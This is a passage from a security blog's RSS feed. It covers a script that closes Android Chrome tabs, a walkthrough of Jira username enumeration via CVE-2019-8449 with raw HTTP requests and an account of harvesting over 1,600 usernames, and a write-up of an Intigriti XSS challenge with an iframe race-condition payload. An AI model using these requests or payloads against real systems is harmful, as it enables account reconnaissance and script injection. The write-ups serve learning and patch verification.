+   "devtoolsFrontendUrl": "http://chrome-devtools-frontend.appspot.com/serve_rev/@a9b97dff480d5c50843b5190c4d02373a0fc6d84/inspector.html?ws=localhost:9222/devtools/page/E49927F7E60C49875AF1E0A783ACD140",
+   "id": "E49927F7E60C49875AF1E0A783ACD140",
+   "title": "",
+   "type": "other",
+   "url": "",
+   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/E49927F7E60C49875AF1E0A783ACD140"
+}, {
+   "description": "",
+   "devtoolsFrontendUrl": "http://chrome-devtools-frontend.appspot.com/serve_rev/@a9b97dff480d5c50843b5190c4d02373a0fc6d84/inspector.html?ws=localhost:9222/devtools/page/16025",
+   "id": "16025",
+   "title": "Should You Do Your Own Taxes? (and Why I Don’t) | Mr. Money Mustache",
+   "type": "page",
+   "url": "https://www.mrmoneymustache.com/2016/02/10/should-you-do-your-own-taxes/",
+   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/16025"
+}, {
+</pre>
+<p>Next, I went to <a href="http://localhost:9222/json/close/16025">http://localhost:9222/json/close/16025</a>, and received the message, "Target is closing". When I went back to my Android device, I saw that the tab was closed!</p>
+<h2>Automation</h2>
+<p>With manual closing verified, it was time to write a script to help <a href="https://www.doyler.net/security-not-included/extract-android-chrome-tabs#comment-45943">Matt</a>, and anyone else out.</p>
+<p>You can find the code below, but it is obviously pretty simple.</p>
+<pre class="prettyprint">
+import json
+import requests
+
+response = requests.get("http://localhost:9222/json/list")
+
+#print(response.text.encode('utf-8'))
+
+json_data = json.loads(response.text.encode('utf-8'))
+
+for link in json_data:
+    #print(link['id'])
+    response = requests.get("http://localhost:9222/json/close/" + link['id'])
+    print(response.text)
+</pre>
+<p>When I ran this script, it closed all 80 tabs that I had open quickly.</p>
+<pre class="console">
+C:\Users\Ray\Documents\GitHub\SecurityTools\AndroidCloseTabs&gt;python androidCloseTabs.py
+Target is closing
+Target is closing
+Target is closing
+Target is closing
+...
+</pre>
+<p>As you can see, when I went back to my device, I had zero open tabs.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-3-closed.png"><img src="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-3-closed-512x1024.png" alt="Close Android Chrome Tabs - Zero tabs" width="500" height="1000" class="alignnone size-large wp-image-4884" srcset="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-3-closed-512x1024.png 512w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-3-closed-150x300.png 150w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-3-closed-768x1536.png 768w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-3-closed-1024x2048.png 1024w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-3-closed.png 1440w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>Finally, you can find the code and any updates in my <a href="https://github.com/doyler/SecurityTools/tree/master/AndroidCloseTabs">GitHub repository</a></p>
+<h2>Close Android Chrome Tabs - Conclusion</h2>
+<p>This was a simple solution and script, but I'm glad that I finally got to answer the comment on my original post.</p>
+<p>Let me know if you have any other useful tricks for people who abuse tabs like myself!</p>
+<p>Con season is coming up, so hopefully I will have more CTF or general conference posts. I'm also still working through the <a href="https://www.elearnsecurity.com/course/exploit_development_student/">eLearnSecurity XDS</a> course, and I'm hoping to finish that up before Q2.</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/close-android-chrome-tabs">Close Android Chrome Tabs &#8211; Now With Automation</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/close-android-chrome-tabs/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4871</post-id>	</item>
+		<item>
+		<title>More Jira Enumeration (usernames) &#8211; CVE-2019-8449</title>
+		<link>https://www.doyler.net/security-not-included/more-jira-enumeration</link>
+					<comments>https://www.doyler.net/security-not-included/more-jira-enumeration#comments</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 08 Feb 2020 17:00:35 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4847</guid>
+
+					<description><![CDATA[<p>I performed even more Jira enumeration on usernames recently but using a different exploit. Jira Enumeration - Introduction First, I recommend you check out my earlier post, as that was a similar attack that was fixed in an earlier patch. &#8230; <a href="https://www.doyler.net/security-not-included/more-jira-enumeration">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/more-jira-enumeration">More Jira Enumeration (usernames) &#8211; CVE-2019-8449</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I performed even more Jira enumeration on usernames recently but using a different exploit.</p>
+<p><span id="more-4847"></span></p>
+<h2>Jira Enumeration - Introduction</h2>
+<p>First, I recommend you check out my <a href="https://www.doyler.net/security-not-included/jira-username-enumeration">earlier post</a>, as that was a similar attack that was fixed in an earlier patch.</p>
+<p>I was on Twitter one day and saw mention of this <a href="https://twitter.com/cyber_advising/status/1224244920770355200">vulnerability</a>.</p>
+<p>Looking at <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8449">CVE-2019-8449</a>, this seemed like another easy exploit.</p>
+<p>This was again only a brief time after the disclosure, so it was another n-day attempt. I used the same target as last time, as I knew a bit about the usernames.</p>
+<h2>Testing the Vulnerability</h2>
+<p>First, I found a <a href="https://github.com/mufeedvh/CVE-2019-8449/blob/master/CVE-2019-8449.py">python script</a> that would exploit the vulnerability, so I built my HTTP requests using this as an example.</p>
+<p>Next, to verify that I correctly formatted my request, I sent a valid request to the groupuserpicker endpoint. I assumed that there wasn't a fake.user12345 on the target, to see the false scenario. </p>
+<pre class="console">
+<span class="highlight">GET /rest/api/latest/groupuserpicker?query=fake.user12345&maxResults=50&showAvatar=false</span> HTTP/1.1
+Host: jira.target.com
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3910.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+</pre>
+<p>As you can see, the server responded with a JSON body showing that there were 0 matches.</p>
+<pre class="console">
+HTTP/1.1 200 
+Date: Wed, 05 Feb 2020 17:08:21 GMT
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Set-Cookie: [Cookie]
+X-ANODEID: node-c
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-AUSERNAME: anonymous
+Cache-Control: no-cache, no-store, no-transform
+Content-Length: 148
+
+<span class="highlight">{"users":{"users":[],"total":0,"header":"Showing 0 of 0 matching users"},"groups":{"header":"Showing 0 of 0 matching groups","total":0,"groups":[]}}</span>
+</pre>
+<p>Next, I sent a request with a user that I knew existed, to see the true scenario.</p>
+<pre class="console">
+<span class="highlight">GET /rest/api/latest/groupuserpicker?query=raymond.doyle&maxResults=50&showAvatar=false</span> HTTP/1.1
+Host: jira.target.com
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3910.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+</pre>
+<p>As you can see, the server responded with a different message showed that there was one matching user.</p>
+<pre class="console">
+HTTP/1.1 200 
+Date: Wed, 05 Feb 2020 17:08:38 GMT
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Set-Cookie: [Cookie]
+X-ANODEID: node-a
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-AUSERNAME: anonymous
+Cache-Control: no-cache, no-store, no-transform
+Content-Length: 280
+
+<span class="highlight">{"users":{"users":[{"name":"raymond.doyle","key":"raymond.doyle","html":"Raymond Doyle (<strong>raymond.doyle</strong>)","displayName":"Raymond Doyle"}],"total":1,"header":"Showing 1 of 1 matching users"},"groups":{"header":"Showing 0 of 0 matching groups","total":0,"groups":[]}}</span>
+</pre>
+<p>After verifying the vulnerability, I fired up Intruder for the full attack. I used <a href="https://github.com/strupo/usernames">strupo's username list</a> again, combined with some custom wordlists from last time. In the end, I sent just over 300,000 requests to the target.</p>
+<p>I got plenty of valid responses, as you can see from this redacted screenshot.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreJiraEnum/moreJiraEnum-1-success.png"><img src="https://www.doyler.net/wp-content/uploads/moreJiraEnum/moreJiraEnum-1-success.png" alt="More Jira Enumeration - Success" width="573" height="374" class="alignnone size-full wp-image-4862" srcset="https://www.doyler.net/wp-content/uploads/moreJiraEnum/moreJiraEnum-1-success.png 573w, https://www.doyler.net/wp-content/uploads/moreJiraEnum/moreJiraEnum-1-success-300x196.png 300w" sizes="(max-width: 573px) 100vw, 573px" /></a></p>
+<p>In the end, I enumerated over 1600 users, which was an improvement of over 100 from my last attack!</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/Jira_CVE20198449</span># wc -l unique-users.txt 
+    1611 unique-users.txt
+</pre>
+<h2>Post Patch</h2>
+<p>Once my target deployed their patches, I went back and verified the fix.</p>
+<p>As you can see, an unauthenticated user can no longer call the groupuserpicker endpoint, preventing the username enumeration.</p>
+<p><b>Raw Request</b></p>
+<pre class="console">
+<span class="highlight">GET /rest/api/latest/groupuserpicker?query=admin&maxResults=50&showAvatar=false</span> HTTP/1.1
+Host: jira.target.com
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3910.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+</pre>
+<p><b>Raw Response</b></p>
+<pre class="console">
+HTTP/1.1 403 
+Date: Fri, 07 Feb 2020 12:01:14 GMT
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Set-Cookie: [Cookie]
+X-ANODEID: node-a
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-AUSERNAME: anonymous
+Cache-Control: no-cache, no-store, no-transform
+Content-Length: 77
+
+<span class="highlight">You are not authenticated. Authentication required to perform this operation.</span>
+</pre>
+<h2>Jira Enumeration - Conclusion</h2>
+<p>This vulnerability was like the last one, but it was another case of good timing.</p>
+<p>I added an additional 100 users to my target list as well, which is a nice win.</p>
+<p>A vulnerability like this is something that a long-term adversary would exploit, so make sure that you confirm as well as patch as soon as possible.</p>
+<p>As usual, I've got plenty of posts in the hopper, but please let me know if there is anything specific that you'd like to see!</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/more-jira-enumeration">More Jira Enumeration (usernames) &#8211; CVE-2019-8449</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/more-jira-enumeration/feed</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4847</post-id>	</item>
+		<item>
+		<title>More Intigriti XSS &#8211; Just Shy of Success</title>
+		<link>https://www.doyler.net/security-not-included/more-intigriti-xss</link>
+					<comments>https://www.doyler.net/security-not-included/more-intigriti-xss#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 01 Feb 2020 17:00:18 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4510</guid>
+
+					<description><![CDATA[<p>I attempted another Intigriti XSS challenge a few months ago and wanted to share my attempts. More Intigriti XSS - Introduction If you saw my last post, then you are at least partially familiar with these XSS challenges. This was &#8230; <a href="https://www.doyler.net/security-not-included/more-intigriti-xss">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/more-intigriti-xss">More Intigriti XSS &#8211; Just Shy of Success</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I attempted another Intigriti XSS challenge a few months ago and wanted to share my attempts.</p>
+<p><span id="more-4510"></span></p>
+<h2>More Intigriti XSS - Introduction</h2>
+<p>If you saw my <a href="https://www.doyler.net/security-not-included/intigriti-xss-challenge-dom-xss">last post</a>, then you are at least partially familiar with these XSS challenges.</p>
+<p>This was another interesting challenge that they <a href="https://www.intigriti.com/programs/intigriti/10kfollowers-xsschallenge/detail">posted</a>, and I wanted a shot at it.</p>
+<p>Unfortunately, I was unable to solve this challenge at all completely. That said, I found a lot of great solutions, and got close in the end.</p>
+<h2>The Challenge</h2>
+<p>If Intigriti removes the the challenge, then you can find the <a href="https://challenge.intigriti.io">vulnerable code</a> snippet below.</p>
+<pre class="prettyprint">
+  const whitelist = ['intigriti.com','intigriti.io'];
+  var url = new URL(location.hash.substr(1));
+  if(whitelist.indexOf(url.hostname) &gt; -1){
+    document.write("Redirecting you to " + encodeURIComponent(url.href) + "...");
+    window.setTimeout(function(){
+      location = location.hash.substr(1);
+    });
+  }
+  else{
+    document.write(url.hostname + " is not a valid domain.")
+  }
+</pre>
+<p>You can find the challenge specifics below as well.</p>
+<ul>
+<li>Goal: trigger a javascript pop-up on tchallege.intigriti.io using a XSS vulnerability introduced by the javascript snippet above in the latest version of Google Chrome or Firefox</li>
+<li>Tips: We'll tweet out a tip for every 100 likes at https://twitter.com/intigriti</li>
+<li>Done?: Submit your solution to https://go.intigriti.com/submit-solution</li>
+<li>Date: This challenge runs from Monday Nov 18 until Sunday Nov 24</li>
+<li>Prize: The winner gets a Burp Suite Pro License</li>
+<li>Winner: Out of all correct submissions, we'll randomly draw a winner and announce it on our Twitter profile on Nov 25th</li>
+</ul>
+<p>Finally, here are the hints that Intigriti tweeted.</p>
+<ul>
+<li>100 likes, time for the first tip! You all need a timeout!</li>
+<li>200 likes, tip time! Bug bounty is always a bit like a race...</li>
+<li>Did someone just buy likes? <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f602.png" alt="😂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Another tip: follow the thread</li>
+<li>400 likes, time for another tip! #1 #2</li>
+<li>Another hint: it might take a few tries</li>
+</ul>
+<h2>Intigriti XSS - Attempted Solution(s)</h2>
+<p>With the challenge in hand, I started to work on my solution.</p>
+<p>First, I tried to understand how the <a href="https://developer.mozilla.org/en-US/docs/Web/API/URL/URL">URL</a> constructor worked.</p>
+<pre class="console">
+&gt; var url = new URL('intigriti.com');
+VM36:1 Uncaught TypeError: Failed to construct 'URL': Invalid URL
+    at &lt;anonymous&gt;:1:11
+</pre>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-1-failedURL.png"><img src="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-1-failedURL-1024x149.png" alt="More Intigriti XSS - Failed URL" width="500" height="73" class="alignnone size-large wp-image-4795" srcset="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-1-failedURL-1024x149.png 1024w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-1-failedURL-300x44.png 300w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-1-failedURL-768x112.png 768w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-1-failedURL.png 1268w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>As it turns out, the protocol is needed, so that immediately eliminated a few of my first ideas.</p>
+<pre class="console">
+&gt; var url = new URL('https://www.intigriti.com');
+undefined
+&gt; url
+URL {href: "https://www.intigriti.com/", origin: "https://www.intigriti.com", protocol: "https:", username: "", password: "", …}
+&gt; url.hostname
+"www.intigriti.com"
+</pre>
+<p>Next, I tried using a subdomain (www) of one of the white-listed URLs.</p>
+<p><a href="https://challenge.intigriti.io/#https://www.intigriti.com">https://challenge.intigriti.io/#https://www.intigriti.com</a></p>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-2-www.png"><img src="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-2-www.png" alt="WWW" width="546" height="146" class="alignnone size-full wp-image-4796" srcset="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-2-www.png 546w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-2-www-300x80.png 300w" sizes="(max-width: 546px) 100vw, 546px" /></a></p>
+<p>I also spent a lot of time reading the <a href="https://url.spec.whatwg.org/#dom-url-href">URL</a> spec, so at least I learned something.</p>
+<p>When that didn't work, I used a site from the list itself, to verify functionality.</p>
+<p><a href="https://challenge.intigriti.io/#https://intigriti.com">https://challenge.intigriti.io/#https://intigriti.com</a></p>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-3-successfulRedirect.png"><img src="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-3-successfulRedirect.png" alt="Successful redirect" width="522" height="145" class="alignnone size-full wp-image-4797" srcset="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-3-successfulRedirect.png 522w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-3-successfulRedirect-300x83.png 300w" sizes="(max-width: 522px) 100vw, 522px" /></a></p>
+<p>Next, I wanted to see how JavaScript handled multiple hashes in one URL. Unfortunately, it appeared that only the first one was considered the location.hash.</p>
+<p><a href="https://challenge.intigriti.io/#https://testing123.com#https://intigriti.com">https://challenge.intigriti.io/#https://testing123.com#https://intigriti.com</a></p>
+<pre class="console">
+&gt; location.hash
+"#https://testing123.com#https://intigriti.com"
+&gt; var url = new URL(location.hash.substr(1));
+undefined
+&gt; url
+URL {href: "https://testing123.com/#https://intigriti.com", origin: "https://testing123.com", protocol: "https:", username: "", password: "", …}hash: "#https://intigriti.com"host: "testing123.com"hostname: "testing123.com"href: "https://testing123.com/#https://intigriti.com"origin: "https://testing123.com"password: ""pathname: "/"port: ""protocol: "https:"search: ""searchParams: URLSearchParams {}username: ""__proto__: URL
+</pre>
+<p>Additionally, I tried to inject some HTML in the location.hash, in spite of the encodeURIComponent call.</p>
+<p><a href="https://challenge.intigriti.io/#https://intigriti.com#%22%3E%3Cb%3Etest%3C/b%3E">https://challenge.intigriti.io/#https://intigriti.com#%22%3E%3Cb%3Etest%3C/b%3E</a></p>
+<p>Unfortunately, this did not work, and I did not inject any HTML.</p>
+<pre class="console">
+Redirecting you to https%3A%2F%2Fintigriti.com%2F%23%2522%253E%253Cb%253Etest%253C%2Fb%253E...
+</pre>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-4-injectionTest.png"><img src="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-4-injectionTest.png" alt="More Intigriti XSS - Injection attempt" width="763" height="122" class="alignnone size-full wp-image-4798" srcset="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-4-injectionTest.png 763w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-4-injectionTest-300x48.png 300w" sizes="(max-width: 763px) 100vw, 763px" /></a></p>
+<h2>Nearly Successful</h2>
+<p>Between the hints and my attempts, I had a pretty good handle on the solution.</p>
+<p>I thought (correctly) that I needed to exploit a race condition on the hash between the white-list and the redirect.</p>
+<p>First, to verify this, I used a valid URL before the redirect.</p>
+<p><a href="https://challenge.intigriti.io/#https://intigriti.io">https://challenge.intigriti.io/#https://intigriti.io</a></p>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-5-redirectPaused.png"><img src="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-5-redirectPaused-1024x207.png" alt="Redirect paused" width="500" height="101" class="alignnone size-large wp-image-4793" srcset="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-5-redirectPaused-1024x207.png 1024w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-5-redirectPaused-300x61.png 300w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-5-redirectPaused-768x155.png 768w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-5-redirectPaused-1536x311.png 1536w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-5-redirectPaused-2048x414.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>Once I got to the redirect line, I changed the hash and resumed execution.</p>
+<p><a href="https://challenge.intigriti.io/#javascript:alert(document.domain)">https://challenge.intigriti.io/#javascript:alert(document.domain)</a></p>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-6-debuggerAlert.png"><img src="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-6-debuggerAlert-1024x163.png" alt="Debugger alert" width="500" height="80" class="alignnone size-large wp-image-4794" srcset="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-6-debuggerAlert-1024x163.png 1024w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-6-debuggerAlert-300x48.png 300w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-6-debuggerAlert-768x122.png 768w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-6-debuggerAlert-1536x245.png 1536w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-6-debuggerAlert-2048x326.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>This worked and confirmed that I was on the right path.</p>
+<p>Unfortunately, I was unable to progress past this point, and the challenge ended.</p>
+<h2>Correct Solution</h2>
+<p>After the challenge ended, I read a few solutions, and realized that I was on the right path.</p>
+<p>In the end, I would have used a page like this for my solution.</p>
+<pre class="prettyprint">
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Intigriti XSS Challenge&lt;/title&gt;	
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;iframe id= "xss" src="https://challenge.intigriti.io/#https://intigriti.io"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+
+&lt;script&gt;   	
+    setTimeout(function(e){document.getElementById('xss').src = "https://challenge.intigriti.io/#javascript:alert(document.domain)"},200);
+&lt;/script&gt;
+
+&lt;/html&gt;
+</pre>
+<p>As you can see, this successfully popped my alert!</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-7-success.png"><img src="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-7-success-1024x143.png" alt="More Intigriti XSS - Successful alert" width="500" height="70" class="alignnone size-large wp-image-4799" srcset="https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-7-success-1024x143.png 1024w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-7-success-300x42.png 300w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-7-success-768x107.png 768w, https://www.doyler.net/wp-content/uploads/moreIntigritiXSS/moreIntigritiXSS-7-success.png 1184w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>That said, I didn't realize this was in the spirit of the competition, and that was my fault.</p>
+<h2>More Intigriti XSS - Conclusion</h2>
+<p>This was a fun challenge, although I'm a little disappointed that I couldn't solve it in time.</p>
+<p>I'm looking forward to more XSS posts or challenges, so stay tuned.</p>
+<p>Here are just a few of the solutions that I read when it was over, and it was awesome seeing such variety between them. If you have another unique solution that you'd like me to see or add, then let me know!</p>
+<ul>
+<li><a href="https://gist.github.com/radekk/951318d4f7d17658a8586afb2c48c1e9">https://gist.github.com/radekk/951318d4f7d17658a8586afb2c48c1e9</a></li>
+<li><a href="https://twitter.com/melardev/status/1198935691633270785">https://twitter.com/melardev/status/1198935691633270785</a></li>
+<li><a href="view-source:https://terjanq.me/int_xss_5_solution.html#reload">view-source:https://terjanq.me/int_xss_5_solution.html#reload</a></li>
+<li><a href="https://www.codedbrain.com/2019/11/intigriti-10k-followers-xss-challenge/">https://www.codedbrain.com/2019/11/intigriti-10k-followers-xss-challenge/</a></li>
+<li><a href="https://gist.github.com/NRockhouse/bbdcbf3dbd9bf4f857a27edaf6f12689">https://gist.github.com/NRockhouse/bbdcbf3dbd9bf4f857a27edaf6f12689</a></li>
+<li><a href="view-source:https://files.veryhax.ninja/5-intigriti.com.html">view-source:https://files.veryhax.ninja/5-intigriti.com.html</a></li>
+</ul>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/more-intigriti-xss">More Intigriti XSS &#8211; Just Shy of Success</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/more-intigriti-xss/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4510</post-id>	</item>
+		<item>
+		<title>Using Python 2to3 to Easily Upgrade (Finally)</title>
+		<link>https://www.doyler.net/security-not-included/python-2to3-upgrade</link>
+					<comments>https://www.doyler.net/security-not-included/python-2to3-upgrade#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 25 Jan 2020 17:00:54 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4744</guid>
+
+					<description><![CDATA[<p>I finally upgraded one my my repositories using Python 2to3, and I wanted to share how. Python 2to3 - Introduction First, if you were not aware, Python 2 is officially end-of-life. While I am a little late to the update &#8230; <a href="https://www.doyler.net/security-not-included/python-2to3-upgrade">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/python-2to3-upgrade">Using Python 2to3 to Easily Upgrade (Finally)</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I finally upgraded one my my repositories using Python 2to3, and I wanted to share how.</p>
+<p><span id="more-4744"></span></p>
+<h2>Python 2to3 - Introduction</h2>
+<p>First, if you were not aware, Python 2 is officially <a href="https://pythonclock.org/">end-of-life</a>.</p>
+<p>While I am a little late to the update party, I finally got it done on my larger repository.</p>
+<p>There are still repositories and libraries out there that still run on Python 2.7, but hopefully they will all phase out soon.</p>
+<p>Note that you should already have the <a href="https://docs.python.org/2/library/2to3.html">tool</a> installed, as Python released it back in 2018.</p>
+<h2>Usage</h2>
+<p>Usage of the tool is simple, and you can see all the flags below.</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/tools/SecurityTools</span>$ 2to3- --help
+Usage: 2to3 [options] file|dir ...
+
+Options:
+  -h, --help            show this help message and exit
+  -d, --doctests_only   Fix up doctests only
+  -f FIX, --fix=FIX     Each FIX specifies a transformation; default: all
+  -j PROCESSES, --processes=PROCESSES
+                        Run 2to3 concurrently
+  -x NOFIX, --nofix=NOFIX
+                        Prevent a transformation from being run
+  -l, --list-fixes      List available transformations
+  -p, --print-function  Modify the grammar so that print() is a function
+  -v, --verbose         More verbose logging
+  --no-diffs            Don't show diffs of the refactoring
+  -w, --write           Write back modified files
+  -n, --nobackups       Don't write backups for modified files
+  -o OUTPUT_DIR, --output-dir=OUTPUT_DIR
+                        Put output files in this directory instead of
+                        overwriting the input files.  Requires -n.
+  -W, --write-unchanged-files
+                        Also write files even if no changes were required
+                        (useful with --output-dir); implies -w.
+  --add-suffix=ADD_SUFFIX
+                        Append this string to all output filenames. Requires
+                        -n if non-empty.  ex: --add-suffix='3' will generate
+                        .py3 files.
+</pre>
+<p>I prefer to run the program recursively, and not automatically write any of the changes.</p>
+<p>That said, the -w flag is great if you have a much larger code base with good backups!</p>
+<h2>Performing My Updates</h2>
+<p>I wanted to update my <a href="https://www.doyler.net/security-not-included/cracking-256-bit-rsa-keys">SecurityTools</a> <a href="https://github.com/doyler/SecurityTools">repository</a>, as this is where most of my current code lives.</p>
